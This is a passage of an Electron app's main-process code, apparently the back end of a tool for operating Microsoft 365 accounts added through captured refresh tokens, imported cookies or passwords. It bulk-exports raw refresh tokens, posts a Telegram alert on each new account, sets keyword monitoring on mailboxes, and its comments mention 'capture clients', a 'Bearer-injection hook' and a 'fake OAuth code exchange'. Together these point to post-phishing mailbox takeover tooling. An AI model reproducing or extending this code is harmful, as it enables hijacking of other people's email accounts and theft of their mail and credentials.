        })),
      };
      dlog('[Export] Returning payload with', tokenAccounts.length, 'tokens');
      return { success: true, data: payload, count: tokenAccounts.length };
    } catch (error: any) {
      console.error('[Export] Error:', error);
      return { success: false, error: error?.message || String(error) };
    }
  };

  const exportTokensToPath = async (filePath: string): Promise<{ success: boolean; path?: string; count?: number; error?: string }> => {
    try {
      const outPath = String(filePath || '').trim();
      if (!outPath) return { success: false, error: 'Export path is required' };
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const tokenAccounts = accounts
        .filter((a: any) => a?.auth?.type === 'token')
        .map((a: any) => ({
          id: a.id,
          email: a.email,
          name: a.name,
          status: a.status,
          panelId: a.panelId || null,
          tags: Array.isArray(a.tags) ? a.tags : [],
          auth: {
            type: 'token',
            clientId: a.auth?.clientId,
            authorityEndpoint: a.auth?.authorityEndpoint,
            refreshToken: a.auth?.refreshToken,
            scopeType: a.auth?.scopeType,
            resource: a.auth?.resource,
            v2Token: a.auth?.v2Token || undefined,
          },
          added: a.added,
          lastRefresh: a.lastRefresh,
        }));
      const payload = {
        exportedAt: new Date().toISOString(),
        count: tokenAccounts.length,
        tokens: tokenAccounts,
      };
      await fs.writeFile(outPath, JSON.stringify(payload, null, 2), 'utf8');
      return { success: true, path: outPath, count: tokenAccounts.length };
    } catch (error: any) {
      return { success: false, error: error?.message || String(error) };
    }
  };

  // Export tokens to JSON file
  ipcMain.handle('tokens:exportJSON', async (_, filePath: string) => {
    dlog('Export tokens to', filePath);
    return exportTokensToPath(filePath);
  });

  // Export token accounts data (returns JSON, no file write)
  ipcMain.handle('tokens:exportJSONData', async (_, accountIds?: string[]) => {
    dlog('Export token data for', accountIds?.length || 'all', 'accounts');
    return exportTokenAccountsData(accountIds);
  });

  // Export tokens with native save dialog (Dashboard-safe replacement for prompt()).
  ipcMain.handle('tokens:exportJSONDialog', async () => {
    const picked = await dialog.showSaveDialog({
      title: 'Export token accounts',
      defaultPath: `token-accounts-${new Date().toISOString().slice(0, 10)}.json`,
      filters: [{ name: 'JSON', extensions: ['json'] }],
      properties: ['createDirectory', 'showOverwriteConfirmation'],
    });
    if (picked.canceled || !picked.filePath) return { success: false, canceled: true as const };
    return exportTokensToPath(picked.filePath);
  });

  // Clear activity feed (also reachable via the dashboard:clearActivity channel —
  // both preload bindings should result in an actual reset).
  ipcMain.handle('activity:clear', async () => {
    const store = await readStore();
    store.activityFeed = [];
    await writeStore(store);
    return { success: true };
  });

  // --------------------------
  // Panel IPC handlers (Phase 2)
  // --------------------------
  ipcMain.handle('panel:testConnection', async (_, url: string, username: string, password: string) => {
    const normalizedUrl = normalizePanelUrl(url);
    const loginUrl = `${normalizedUrl}/api/auth/login`;
    let response: Response;
    try {
      response = await fetch(loginUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
        signal: timeoutSignal(15000),
      } as any);
    } catch (err: any) {
      const msg = err?.cause?.message || err?.message || String(err);
      throw new Error(`Cannot reach ${loginUrl}. Check the panel URL is correct and the server is running. (${msg})`);
    }
    if (!response.ok) {
      const text = await response.text();
      throw new Error(text || `Login failed with status ${response.status}`);
    }
    const data = await response.json();
    return data.token;
  });

  ipcMain.handle('panel:save', async (_, name: string, url: string, username: string, password: string) => {
    const normalizedUrl = normalizePanelUrl(url);
    const store = await readStore();
    const panels: any[] = store.panels || [];
    // Check for duplicate
    if (panels.some(p => p.url === normalizedUrl && p.username === username)) {
      throw new Error('Panel with same URL and username already exists');
    }
    const newPanel = {
      id: crypto.randomUUID(),
      name,
      url: normalizedUrl,
      username,
      passwordEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(password).toString('base64') : password,
      status: 'disconnected',
      token: null,
      tokenExpiry: null,
      error: null,
    };
    panels.push(newPanel);
    store.panels = panels;
    await writeStore(store);
    return newPanel;
  });

  ipcMain.handle('panel:connect', async (_, panelId: string) => {
    const store = await readStore();
    const panels: any[] = store.panels || [];
    const panel = panels.find(p => p.id === panelId);
    if (!panel) throw new Error('Panel not found');
    // Decrypt password
    if (!safeStorage.isEncryptionAvailable()) {
      throw new Error('Encryption not available');
    }
    const password = safeStorage.decryptString(Buffer.from(panel.passwordEncrypted, 'base64'));
    // Test connection using same logic as panel:testConnection
    const normalizedUrl = normalizePanelUrl(panel.url);
    const loginUrl = `${normalizedUrl}/api/auth/login`;
    let response: Response;
    try {
      response = await fetch(loginUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: panel.username, password }),
        signal: timeoutSignal(15000),
      } as any);
    } catch (err: any) {
      const msg = err?.cause?.message || err?.message || String(err);
      throw new Error(`Cannot reach ${loginUrl}. Check the panel URL is correct and the server is running. (${msg})`);
    }
    if (!response.ok) {
      const text = await response.text();
      throw new Error(text || `Login failed with status ${response.status}`);
    }
    const data = await response.json();
    const token = data.token;
    // Update panel with token
    panel.token = token;
    panel.tokenExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
    panel.status = 'connected';
    panel.error = null;
    await writeStore(store);
    return panel;
  });

  ipcMain.handle('panel:disconnect', async (_, panelId: string) => {
    const store = await readStore();
    const panels: any[] = store.panels || [];
    const panel = panels.find(p => p.id === panelId);
    if (!panel) throw new Error('Panel not found');
    panel.token = null;
    panel.tokenExpiry = null;
    panel.status = 'disconnected';
    await writeStore(store);
    return panel;
  });

  // NOTE: an old `panel:syncAll` IPC stub used to live here. Per-panel sync is
  // driven from the renderer (`syncPanelAccounts(panelId)`); the stub did
  // nothing but report success, which was misleading. Removed for honesty.

  ipcMain.handle('panel:delete', async (_, panelId: string) => {
    const store = await readStore();
    store.panels = (store.panels || []).filter((p: any) => p.id !== panelId);
    await writeStore(store);
    // Detach accounts (replace panel tag with Detached) - will be handled by renderer service
    return { success: true };
  });

  ipcMain.handle('panel:detachAccounts', async (_, panelId: string) => {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    for (const acc of accounts) {
      if (acc.panelId === panelId) {
        // Replace production/backup tag with Detached
        const tags = acc.tags.filter((t: string) => t !== 'production' && t !== 'backup');
        tags.push('detached');
        acc.tags = tags;
      }
    }
    store.accounts = accounts;
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('panel:previewAccounts', async (_, panelId: string) => {
    const store = await readStore();
    const panel = (store.panels || []).find((p: any) => p.id === panelId);
    if (!panel) throw new Error('Panel not found');
    // Simulate fetch accounts without importing
    return [{ email: 'preview@example.com', name: 'Preview Account' }];
  });

  // --------------------------
  // Token IPC handlers
  // --------------------------


  ipcMain.handle('token:refreshBulk', async (_, ids: string[]) => {
    dlog('Bulk token refresh for', ids.length, 'accounts');
    return ids.map(id => ({ accountId: id, success: true }));
  });

  // --------------------------
  // Monitoring IPC handlers
  // --------------------------
  ipcMain.handle('monitor:add', async (_, accountId: string, folders: string[], keywords: string[]) => {
    const store = await readStore();
    const rules = store.monitoringRules || [];
    // Determine scenario type
    let scenarioType: 'keyword' | 'folder' | 'keyword-in-folder' | 'token' = 'keyword';
    if (keywords.length > 0 && folders.length > 0) {
      scenarioType = 'keyword-in-folder';
    } else if (keywords.length === 0 && folders.length > 0) {
      scenarioType = 'folder';
    } else if (keywords.length > 0 && folders.length === 0) {
      scenarioType = 'keyword';
    }
    // Token scenario is separate (system-generated)
    const newRule = {
      id: crypto.randomUUID(),
      accountId,
      folders,
      keywords,
      scenarioType,
      status: 'active',
      createdAt: new Date().toISOString(),
      lastRun: null,
      lastAlert: null,
    };
    rules.push(newRule);
    store.monitoringRules = rules;
    await writeStore(store);
    return newRule;
  });

  ipcMain.handle('monitor:pause', async (_, listenerId: string) => {
    const store = await readStore();
    const rules = store.monitoringRules || [];
    const rule = rules.find((r: any) => r.id === listenerId);
    if (!rule) throw new Error('Monitoring rule not found');
    rule.status = 'paused';
    await writeStore(store);
    return rule;
  });

  ipcMain.handle('monitor:delete', async (_, listenerId: string) => {
    const store = await readStore();
    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => r.id !== listenerId);
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('monitor:pauseAll', async () => {
    const store = await readStore();
    const rules = store.monitoringRules || [];
    for (const rule of rules) {
      rule.status = 'paused';
    }
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('monitor:resumeAll', async () => {
    const store = await readStore();
    const rules = store.monitoringRules || [];
    for (const rule of rules) {
      rule.status = 'active';
    }
    await writeStore(store);
    return { success: true };
  });

  // --------------------------
  // Alert IPC handlers
  // --------------------------
  ipcMain.handle('alert:markRead', async (_, alertId: string) => {
    const store = await readStore();
    const alerts = store.monitoringAlerts || [];
    const alert = alerts.find((a: any) => a.id === alertId);
    if (!alert) throw new Error('Alert not found');
    alert.read = true;
    await writeStore(store);
    return alert;
  });

  ipcMain.handle('alert:dismiss', async (_, alertId: string) => {
    const store = await readStore();
    store.monitoringAlerts = (store.monitoringAlerts || []).filter((a: any) => a.id !== alertId);
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('alert:markAllRead', async () => {
    const store = await readStore();
    const alerts = store.monitoringAlerts || [];
    for (const alert of alerts as any[]) {
      alert.read = true;
    }
    await writeStore(store);
    return { success: true };
  });

  // --------------------------
  // Search IPC handlers
  // --------------------------
  ipcMain.handle('search:runQueue', async (_, queue: any[], _filters: any) => {
    // For now, just simulate
    dlog('Search queue run requested', queue.length, 'jobs');
    return { success: true };
  });

  ipcMain.handle('search:results', async () => {
    const store = await readStore();
    return store.searchResults || [];
  });

  ipcMain.handle('account:addViaCredentials', async (_, email: string, password: string) => {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);
    const newAccount = {
      id: crypto.randomUUID(), email, name: email.split('@')[0],
      panelId: null, added: new Date().toISOString(), status: 'active',
      tags: ['credential'],
      auth: { type: 'credential', passwordEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(password).toString('base64') : password },
    };
    accounts.push(newAccount);
    store.accounts = accounts;
    await writeStore(store);
    void sendAccountsTelegramNotification(
      store,
      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> credentials`
    );
    return newAccount;
  });

  ipcMain.handle('account:addViaCookies', async (_, email: string, cookies: string) => {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);
    const newAccount = {
      id: crypto.randomUUID(), email, name: email.split('@')[0],
      panelId: null, added: new Date().toISOString(), status: 'active',
      tags: ['cookie-import'],
      auth: { type: 'cookie', cookiesEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(cookies).toString('base64') : cookies },
    };
    accounts.push(newAccount);
    store.accounts = accounts;
    await writeStore(store);
    void sendAccountsTelegramNotification(
      store,
      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> cookie import`
    );
    return newAccount;
  });

  ipcMain.handle('account:addViaToken', async (_, email: string, clientId: string, authorityEndpoint: string, refreshToken: string, scopeType?: string) => {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);

    // First-party Office + common capture clients - opaque RTs need `ews` so we hit v2 .default + v1 fallbacks.
    const ewsDefaultClientIds = new Set(
      ['d3590ed6-52b3-4102-aeff-aad2292ab01c', '9199bf20-a13f-4107-85dc-02114787ef48'].map((s) => s.toLowerCase())
    );
    const cid = (clientId || '').toLowerCase();
    const inferredEws = ewsDefaultClientIds.has(cid);
    // Opaque refresh strings never contain scope names; do not use refreshToken.includes('EWS...').
    const detectedScopeType =
      scopeType && scopeType.length > 0
        ? scopeType
        : inferredEws
          ? 'ews'
          : 'graph';

    const newAccount = {
      id: crypto.randomUUID(),
      email,
      name: email.split('@')[0],
      panelId: null,
      added: new Date().toISOString(),
      status: 'active',
      tags: ['token-import'],
      auth: {
        type: 'token',
        clientId,
        authorityEndpoint,
        refreshToken,
        scopeType: detectedScopeType,
        // OWA refresh + Play need outlook.office.com resource when using EWS scope (not the Exchange GUID alone).
        ...(detectedScopeType === 'ews'
          ? { resource: 'https://outlook.office.com' as const }
          : {}),
      },
    };
    accounts.push(newAccount);
    store.accounts = accounts;
    await writeStore(store);
    dlog(`[Account] Added token-based account ${email} with scopeType: ${detectedScopeType}`);
    void sendAccountsTelegramNotification(
      store,
      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> token (${escapeTelegramHtmlPlain(detectedScopeType)})`
    );
    return newAccount;
  });

  /**
   * Replace the primary `account.auth` for a token-typed account after the
   * user re-authenticates (e.g. after Microsoft revoked the previous refresh
   * token). Clears `requiresReauth` and `lastError`.
   *
   * Distinct from `account:addV2Token` which only sets the v2 sub-field for
   * the OWA / EWS dual-token flow.
   */
  ipcMain.handle(
    'account:replaceTokenAuth',
    async (
      _,
      accountId: string,
      refreshToken: string,
      authorityEndpoint?: string,
      clientId?: string,
      resource?: string,
      scopeType?: string
    ) => {
      if (!refreshToken) throw new Error('refreshToken is required');
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const account = accounts.find(a => a.id === accountId);
      if (!account) throw new Error('Account not found');

      const finalClientId = clientId || account.auth?.clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
      const finalAuthorityEndpoint = authorityEndpoint || account.auth?.authorityEndpoint || 'common';
      const finalScopeType: 'graph' | 'ews' = scopeType === 'graph' ? 'graph' : 'ews';
      const finalResource = resource || (finalScopeType === 'graph' ? 'https://graph.microsoft.com' : 'https://outlook.office.com');

      account.auth = {
        type: 'token',
        clientId: finalClientId,
        authorityEndpoint: finalAuthorityEndpoint,
        refreshToken,
        resource: finalResource,
        scopeType: finalScopeType,
      };
      account.status = 'active';
      account.requiresReauth = false;
      account.lastError = '';
      account.lastRefresh = new Date().toISOString();

      await writeStore(store);
      return { success: true };
    }
  );

  // Add OWA-compatible token to existing account (for OWA UI)
  ipcMain.handle('account:addV2Token', async (_, accountId: string, refreshToken: string, authorityEndpoint?: string, clientId?: string, resource?: string, scopeType?: string) => {
    dlog('[Account] addV2Token called:', { accountId, refreshTokenLength: refreshToken?.length, authorityEndpoint, clientId, resource, scopeType });
    if (!refreshToken) {
      throw new Error('refreshToken is required for v2 token');
    }
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    const account = accounts.find(a => a.id === accountId);
    if (!account) throw new Error('Account not found');
    if (account.auth?.type !== 'token') throw new Error('Account does not have token auth');

    // Defaults
    const finalClientId = clientId || account.auth.clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const finalAuthorityEndpoint = authorityEndpoint || account.auth.authorityEndpoint || 'common';
    const finalResource = resource || 'https://outlook.office.com';
    const finalScopeType = scopeType || 'ews';

    const v2Token = {
      clientId: finalClientId,
      authorityEndpoint: finalAuthorityEndpoint,
      refreshToken,
      resource: finalResource,
      scopeType: finalScopeType,
    };

    // Store v2 token alongside existing auth
    account.auth.v2Token = v2Token;
    await writeStore(store);
    dlog(`[Account] Added v2 token for ${account.email} (clientId: ${finalClientId.substring(0, 8)}..., resource: ${finalResource}, scopeType: ${finalScopeType})`);
    dlog('[Account] v2Token stored:', v2Token);
    const accTg = store.settings?.telegram?.accounts;
    if (accTg?.enabled && accTg?.notifyTokens && accTg?.token && accTg?.chatId) {
      void sendAccountsTelegramNotification(
        store,
        `<b>Token update</b>\n${escapeTelegramHtmlPlain(account.email)}\n<i>OWA / v2 token attached</i>\n<code>${escapeTelegramHtmlPlain(finalScopeType)}</code>`
      );
    }
    return { success: true };
  });

  // Remove v2-Graph token from account
  ipcMain.handle('account:removeV2Token', async (_, accountId: string) => {
    dlog('[Account] Removing v2 token from account', accountId);
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    const account = accounts.find(a => a.id === accountId);
    if (!account) throw new Error('Account not found');
    if (account.auth?.v2Token) {
      delete account.auth.v2Token;
      await writeStore(store);
      dlog(`[Account] Removed v2 token from ${account.email}`);
      return { success: true, removed: true };
    }
    return { success: true, removed: false };
  });

  ipcMain.handle('account:delete', async (_, accountId: string) => {
    const store = await readStore();
    store.accounts = (store.accounts || []).filter((a: any) => a.id !== accountId);
    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => r.accountId !== accountId);
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('account:deleteBulk', async (_, ids: string[]) => {
    const store = await readStore();
    const idSet = new Set(ids);
    store.accounts = (store.accounts || []).filter((a: any) => !idSet.has(a.id));
    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => !idSet.has(r.accountId));
    await writeStore(store);
    return { success: true, deleted: ids.length };
  });

  ipcMain.handle('account:exportJSON', async (_, accountId: string) => {
    const store = await readStore();
    const account = (store.accounts || []).find((a: any) => a.id === accountId);
    if (!account) throw new Error('Account not found');
    const exported = { ...account };
    delete exported.auth;
    return JSON.stringify(exported, null, 2);
  });

  ipcMain.handle('account:exportBulkCSV', async (_, ids: string[]) => {
    const store = await readStore();
    const idSet = new Set(ids);
    const accounts = (store.accounts || []).filter((a: any) => idSet.has(a.id));
    const header = 'id,email,name,panelId,status,tags,added';
    const rows = accounts.map((a: any) =>
      [a.id, a.email, a.name || '', a.panelId || '', a.status, (a.tags || []).join('|'), a.added].join(',')
    );
    return [header, ...rows].join('\n');
  });

  ipcMain.handle('account:testLogin', async (_, email: string, password: string) => {
    const store = await readStore();
    const account = (store.accounts || []).find((a: any) => a.email === email);
    if (!account?.panelId) return { success: false, message: 'No panel associated' };
    const panel = (store.panels || []).find((p: any) => p.id === account.panelId);
    if (!panel) return { success: false, message: 'Panel not found' };
    try {
      const response = await fetch(`${panel.url}/api/auth/login`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: email, password }),
        signal: timeoutSignal(10000),
      } as any);
      if (!response.ok) return { success: false, message: `Login failed: ${response.status}` };
      const data = await response.json();
      return { success: true, token: data.token };
    } catch (err: any) { return { success: false, message: err.message }; }
  });

  ipcMain.handle('tags:create', async (_, name: string, color: string) => {
    const store = await readStore();
    const userTags: any[] = store.tags?.user || [];
    const newTag = { id: crypto.randomUUID(), name: name.trim(), color, type: 'user', locked: false };
    userTags.push(newTag);
    store.tags = { ...(store.tags || {}), user: userTags };
    await writeStore(store);
    return newTag;
  });

  ipcMain.handle('tags:update', async (_, tagId: string, name: string, color: string) => {
    const store = await readStore();
    const userTags: any[] = store.tags?.user || [];
    const tag = userTags.find((t: any) => t.id === tagId);
    if (!tag) throw new Error('Tag not found');
    tag.name = name.trim(); tag.color = color;
    store.tags = { ...(store.tags || {}), user: userTags };
    await writeStore(store);
    return tag;
  });

  ipcMain.handle('tags:delete', async (_, tagId: string) => {
    const store = await readStore();
    const userTags: any[] = store.tags?.user || [];
    const tag = userTags.find((t: any) => t.id === tagId);
    if (!tag) throw new Error('Tag not found');
    if (tag.locked) throw new Error('Cannot delete a system tag');
    const accounts: any[] = store.accounts || [];
    accounts.forEach((a: any) => { a.tags = (a.tags || []).filter((t: string) => t !== tagId && t !== tag.name); });
    store.tags = { ...(store.tags || {}), user: userTags.filter((t: any) => t.id !== tagId) };
    store.accounts = accounts;
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('browser:open', async (_, url: string) => {
    await shell.openExternal(url);
    return { success: true };
  });

  const handleOpenOwaExternalSignIn = async (_: unknown, accountId: string) => {
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const account = accounts.find((a: any) => a.id === accountId);
      if (!account?.email) throw new Error('Account not found');

      const settings = store.settings || {};
      const ms = settings.microsoftOAuth || {};
      const clientId =
        (typeof ms.clientId === 'string' && ms.clientId.trim()) ||
        account.auth?.clientId ||
        'd3590ed6-52b3-4102-aeff-aad2292ab01c';
      const authority =
        (typeof ms.tenantId === 'string' && ms.tenantId.trim()) ||
        normalizeAuthorityTenant(account.auth?.authorityEndpoint || 'common') ||
        'common';
      const redirectUri =
        (typeof ms.redirectUri === 'string' && ms.redirectUri.trim()) ||
        'https://outlook.office.com/mail/';
      const scopes =
        Array.isArray(ms.scopes) && ms.scopes.length > 0
          ? ms.scopes.filter((s: unknown) => typeof s === 'string' && s.trim())
          : ['openid', 'profile', 'offline_access', 'https://outlook.office.com/.default'];
      const url = new URL(`https://login.microsoftonline.com/${encodeURIComponent(authority)}/oauth2/v2.0/authorize`);
      url.searchParams.set('client_id', clientId);
      url.searchParams.set('response_type', 'code');
      url.searchParams.set('redirect_uri', redirectUri);
      url.searchParams.set('response_mode', 'query');
      url.searchParams.set('scope', scopes.join(' '));
      url.searchParams.set('prompt', 'select_account');
      url.searchParams.set('login_hint', account.email);

      await shell.openExternal(url.toString());
      return { success: true as const, opened: true as const };
    } catch (error: any) {
      return { success: false as const, error: error?.message || String(error) };
    }
  };
  ipcMain.handle('owa:openExternalSignIn', handleOpenOwaExternalSignIn);
  // Back-compat alias for older renderer builds / branches.
  ipcMain.handle('openOwaExternalSignIn', handleOpenOwaExternalSignIn);

  /**
   * Open Outlook on the web in the user's *default OS browser* (Chrome /
   * Safari / Firefox / Edge — whatever is registered as the system browser).
   *
   * This goes straight to AAD's `/oauth2/v2.0/authorize` endpoint with the
   * email pre-filled via `login_hint` and `prompt=select_account`, then
   * `redirect_uri=https://outlook.office.com/mail/` so AAD bounces the user
   * straight into their inbox after sign-in. The OWA bootstrap URL strips
   * `login_hint` during its handoff, which is why we don't use it.
   *
   * NOTE: Microsoft does NOT issue AAD session cookies in exchange for a
   * refresh token, so this flow can never be fully password-less. The user
   * will be prompted for their password (and MFA, if configured) unless
   * their browser already has an AAD session for this account. The only
   * truly password-less path is the in-app `Sign in (in-app browser)`
   * button which uses our Bearer-injection hook.
   */
  ipcMain.handle('owa:openInDefaultBrowser', async (_, accountId: string) => {
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const account = accounts.find((a: any) => a.id === accountId);
      if (!account?.email) throw new Error('Account not found');

      const settings = store.settings || {};
      const ms = settings.microsoftOAuth || {};
      const clientId =
        (typeof ms.clientId === 'string' && ms.clientId.trim()) ||
        account.auth?.clientId ||
        'd3590ed6-52b3-4102-aeff-aad2292ab01c';
      const authority =
        (typeof ms.tenantId === 'string' && ms.tenantId.trim()) ||
        normalizeAuthorityTenant(account.auth?.authorityEndpoint || 'common') ||
        'common';
      const redirectUri =
        (typeof ms.redirectUri === 'string' && ms.redirectUri.trim()) ||
        'https://outlook.office.com/mail/';

      // No `prompt` parameter on purpose: that lets AAD use its default
      // "smart" behavior — if the user's browser already has an active AAD
      // session for this account, AAD silently redirects to the inbox
      // (true 1-click). Setting `prompt=select_account` would force the
      // account-picker even for users with a single matching session;
      // setting `prompt=none` would 400 if there is no session (which we
      // can't gracefully recover from in `shell.openExternal`).
      //
      // `login_hint` + `domain_hint` make AAD pick the right account / IDP
      // automatically when there are multiple sessions in the browser.
      const url = new URL(
        `https://login.microsoftonline.com/${encodeURIComponent(authority)}/oauth2/v2.0/authorize`
      );
      url.searchParams.set('client_id', clientId);
      url.searchParams.set('response_type', 'code');
      url.searchParams.set('redirect_uri', redirectUri);
      url.searchParams.set('response_mode', 'query');
      url.searchParams.set('scope', 'openid profile offline_access https://outlook.office.com/.default');
      url.searchParams.set('login_hint', account.email);
      const domainHint = account.email.split('@')[1];
      if (domainHint) url.searchParams.set('domain_hint', domainHint);

      await shell.openExternal(url.toString());
      return { success: true as const, email: account.email, url: url.toString() };
    } catch (error: any) {
      return { success: false as const, error: error?.message || String(error) };
    }
  });

  ipcMain.handle(
    'files:saveTextWithDialog',
    async (
      _,
      opts: { defaultFilename: string; content: string; filters?: { name: string; extensions: string[] }[] }
    ) => {
      const win = BrowserWindow.getFocusedWindow() ?? mainWindow;
      const dlgOpts = {
        defaultPath: opts.defaultFilename,
        filters:
          opts.filters && opts.filters.length > 0
            ? opts.filters
            : [{ name: 'Text', extensions: ['txt'] }],
      };
      const result = win ? await dialog.showSaveDialog(win, dlgOpts) : await dialog.showSaveDialog(dlgOpts);
      if (result.canceled || !result.filePath) {
        return { ok: false as const };
      }
      await fs.writeFile(result.filePath, opts.content, 'utf-8');
      return { ok: true as const, path: result.filePath };
    }
  );

  ipcMain.handle('browser:openPopup', async (_, url: string) => {
    return new Promise((resolve, reject) => {
      const popup = new BrowserWindow({ width: 1024, height: 768, webPreferences: { nodeIntegration: false, contextIsolation: true } });
      const ses = popup.webContents.session;
      popup.loadURL(url);
      popup.once('closed', async () => {
        try {
          const cookies = await ses.cookies.get({ domain: new URL(url).hostname });
          resolve({ success: true, cookies: cookies.map((c: any) => `${c.name}=${c.value}`).join('; ') });
        } catch (err: any) { reject(err); }
      });
    });
  });

  ipcMain.handle('browser:openLoginPage', async (_, url: string) => {
    return new Promise((resolve, reject) => {
      const popup = new BrowserWindow({ width: 1024, height: 768, webPreferences: { nodeIntegration: false, contextIsolation: true } });
      const ses = popup.webContents.session;
      popup.loadURL(url);
      popup.once('closed', async () => {
        try {
          const cookies = await ses.cookies.get({ domain: new URL(url).hostname });
          resolve({ success: true, cookies: cookies.map((c: any) => `${c.name}=${c.value}`).join('; ') });
        } catch (err: any) { reject(err); }
      });
    });
  });

  ipcMain.handle('settings:save', async (_, allSettings: any) => {
    const store = await readStore();
    store.settings = { ...(store.settings || {}), ...allSettings };
    await writeStore(store);
    // Restart token refresh scheduler with possibly new interval
    startTokenRefreshScheduler().catch(err =>
      console.error('Failed to restart token refresh scheduler:', err)
    );
    return { success: true };
  });

  ipcMain.handle('dashboard:clearActivity', async () => {
    const store = await readStore();
    store.activityFeed = [];
    await writeStore(store);
    return { success: true };
  });

  ipcMain.handle('tokens:exportCSV', async () => {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    const header = 'email,token,status';
    const rows = accounts.map((a: any) => [a.email, a.auth?.refreshToken || '', a.status].join(','));
    return [header, ...rows].join('\n');
  });

  /**
   * Snapshot of the background token refresh scheduler. Renderer reads this on
   * Settings open to show: scheduler running?, last run time, last summary.
   */
  ipcMain.handle('tokens:refreshStatus', async () => {
    const store = await readStore();
    const intervalMinutes = store.settings?.refresh?.intervalMinutes ?? 45;
    return {
      schedulerRunning: tokenRefreshIntervalId !== null,
      intervalMinutes,
      lastRunAt: lastTokenRefresh?.ranAt ?? null,
      lastReason: lastTokenRefreshReason,
      lastResult: lastTokenRefresh?.result ?? null,
    };
  });

  /** Manual 'Run now' button on Settings → Refresh. */
  ipcMain.handle('tokens:refreshNow', async () => {
    lastTokenRefreshReason = 'manual';
    const result = await refreshAllTokens();
    return { success: true, ranAt: lastTokenRefresh?.ranAt ?? new Date().toISOString(), result };
  });

  ipcMain.handle('ui:openTagEditor', async (_, accountId: string) => {
    dlog('ui:openTagEditor', accountId);
    return { success: true };
  });

  ipcMain.handle('ui:openBulkTagEditor', async (_, ids: string[]) => {
    dlog('ui:openBulkTagEditor', ids.length, 'accounts');
    return { success: true };
  });

  ipcMain.handle('updater:check', async () => {
    // Updater is not yet wired to a real release feed. Returning a stable
    // "no update" response avoids hitting a guaranteed 404 (and burning
    // GitHub anti-abuse budget) on every check.
    return { hasUpdate: false, message: 'Updater not configured' };
  });

  // Microsoft Graph OAuth (main process, no CORS)
  ipcMain.handle(
    'microsoft:getAccessToken',
    async (_, clientId: string, authority: string, refreshToken: string, scopeType?: string, resource?: string) => {
    dlog('[Microsoft] getAccessToken called', {
      clientId: clientId?.substring(0, 8),
      authority,
      refreshTokenLength: refreshToken?.length,
      scopeType: scopeType || 'graph',
    });
    try {
      const result = await refreshMicrosoftToken(clientId, authority, refreshToken, scopeType || 'graph', resource);
      dlog('[Microsoft] Token refresh successful', { expiresIn: result.expiresIn });
      return { success: true, ...result };
    } catch (error: any) {
      console.error('[Microsoft] Token refresh failed:', error.message, error.code);
      return { success: false, error: error.message, code: error.code };
    }
    }
  );

  ipcMain.handle('token:refresh', async (_, accountId: string) => {
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const account = accounts.find(a => a.id === accountId);
      if (!account) throw new Error('Account not found');
      if (account.auth?.type !== 'token') throw new Error('Account does not have token-based auth');
      const { clientId, authorityEndpoint, refreshToken } = account.auth;
      if (!clientId || !authorityEndpoint || !refreshToken) throw new Error('Missing required auth fields');
      const scopeType = account.auth.scopeType || 'ews';
      const resource = account.auth.resource;
      const result = await refreshMicrosoftToken(clientId, authorityEndpoint, refreshToken, scopeType, resource);
      // Update account
      account.auth.refreshToken = result.refreshToken;
      account.auth.scopeType = scopeType;
      account.lastRefresh = new Date().toISOString();
      account.status = 'active';
      await writeStore(store);
      return { success: true, accountId, newRefreshToken: result.refreshToken };
    } catch (error: any) {
      if (error.code === 'REFRESH_TOKEN_EXPIRED') {
        // Mark account expired
        const store = await readStore();
        const accounts: any[] = store.accounts || [];
        const account = accounts.find(a => a.id === accountId);
        if (account) {
          account.status = 'expired';
          account.lastRefresh = new Date().toISOString();
          await writeStore(store);
        }
        return { success: false, error: 'REFRESH_TOKEN_EXPIRED', accountId };
      }
      return { success: false, error: error.message || 'Unknown error', accountId };
    }
  });

  ipcMain.handle('token:refreshAll', async () => {
    const results = await refreshAllTokens();
    return { ok: true, ...results };
  });

  // Debug helpers: pull/copy recent Outlook + OWA console traces.
  ipcMain.handle('debug:getOutlookLogs', async () => {
    return { success: true, text: outlookDebugLines.join('\n'), lines: outlookDebugLines.length };
  });

  ipcMain.handle('debug:copyOutlookLogs', async () => {
    const text = outlookDebugLines.join('\n');
    clipboard.writeText(text);
    const debugPath = path.join(userDataPath, 'outlook-debug.log');
    await fs.writeFile(debugPath, text, 'utf-8');
    return { success: true, lines: outlookDebugLines.length, path: debugPath };
  });

  // Return raw tokens for preload's fake OAuth code exchange
